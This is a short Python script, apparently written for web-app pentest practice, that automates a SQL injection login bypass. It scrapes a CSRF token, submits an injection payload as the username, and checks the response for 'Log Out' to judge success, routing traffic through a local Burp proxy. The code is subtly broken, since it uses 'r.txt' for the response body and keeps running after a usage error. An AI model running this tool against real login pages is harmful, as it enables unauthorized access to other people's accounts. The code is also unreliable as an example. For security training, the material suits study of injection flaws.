#sql injection based on url provided and the payload intended to be injected
import sys
import urllib3
import requests #allows http/https request for app pentesting
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)#remove unverified https request warnings
#proxies are used for debugging your script
proxies = {'http':'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}#This will run through the burpsuite proxy


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)#verify parameter is used to verify certificate
    soup = BeautifulSoup(r.txt, 'html.parser')
    csrf = soup.find("input")['value']#this lines goes on and searches for input then goes ahead to search for value but this time
    #takes the value of value.This part can be changed depending on the app
    return csrf # this allows csrf to be called in a another function


def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)#make a request to the login page
    data = {"csrf": csrf, # the csrf token is set to csrf
            "username": payload, #the username field is inserted with the payload
            "password": "randomtext"}
    r = s.post(url, data=data, verify=False, proxies=proxies) #post request
    res = r.txt #response saved in r.txt
    if 'Log Out' in res:#checks if login was successful
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()

    except IndexError:
        print('[-] Usage: %s <url> <sqli_payload>' % sys.argv[0])
        print('[+] Example: %s www.example.com "1=1"' % sys.argv[0] )
        
    s = requests.Session() #allows to process parameters across the session by creating a session object from request library

    if exploit_sqli(s, url, sqli_payload):
        print('[+] sql injection successful...')
    else:
        print('[-] sql injection unsuccessful...')
